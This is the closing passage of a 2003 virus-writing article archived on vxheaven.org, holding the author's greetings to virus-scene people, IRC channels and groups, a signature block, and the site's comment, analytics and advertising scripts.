  - VxF                  &lt;-- You still don't like your old (longer) nick? :)
  - MetalKid             &lt;-- NickRipper!!! :D
  - PanoiX               &lt;-- #backdoor-rulez! Danke für X-access!
  - Perikles             &lt;-- Many thanks for X-access in #vxers!
  - Zed, Industry, Adious, DvL, Nekr0, Arzy &lt;-- I want to see more from you!!!
  - much other I forgot  &lt;-- Thanks for sources, helping me or whatever,...

  - channel-greets flies to #virus, #vir, #vxers, #gigavirii, #backdoor, #blackgate
  - group-greets goes to rRlf (sure :D), 29A, iKx, MetaPhase, TKT, MIONS
</pre>
<pre>
							- - - - - - - - - - - - - - -
							  Second Part To Hell/[rRlf]  
							  www.spth.de.vu
							  <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="cebdbebaa68eafa1a0a3afa7a2e0afba">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>
							  written from may-august 2003
							  Austria
							- - - - - - - - - - - - - - -</pre>
[<a style="" href="/lib/?lang=EN&amp;index=MA#vsp02">Back to index</a>] [<a href="/lib/vsp02.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vsp02">de</a><a href="/lib/index.php?lang=en&amp;id=vsp02">en</a><a href="/lib/index.php?lang=es&amp;id=vsp02">es</a><a href="/lib/index.php?lang=it&amp;id=vsp02">it</a><a href="/lib/index.php?lang=fr&amp;id=vsp02">fr</a><a href="/lib/index.php?lang=pl&amp;id=vsp02">pl</a><a href="/lib/index.php?lang=ru&amp;id=vsp02">ru</a><a href="/lib/index.php?lang=ua&amp;id=vsp02">ua</a></div>
</body>
</html>
